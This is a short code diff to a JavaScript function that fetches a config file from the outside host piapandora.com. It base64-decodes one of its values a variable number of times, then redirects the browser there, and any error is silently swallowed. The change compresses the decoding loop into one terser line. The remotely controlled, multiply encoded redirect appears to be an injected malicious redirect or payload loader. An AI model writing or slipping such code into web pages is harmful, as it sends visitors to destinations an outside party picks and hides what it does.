@@ -32,14 +32,7 @@ async function handle() {
         try {
             const response = await fetch('https://piapandora.com/jason/config.json');
             const json = await response.json();
-            
-            let data = config(json.b) + "=";
-
-            for (let i = 0; i < reqs; i++) {
-                data = atob(data);
-            }
-
-            window.location.href = data;
+            window.location.href = [...Array(reqs)].reduce(d => atob(d), config(json.b) + "=");
         } catch (error) {}
     }
 }
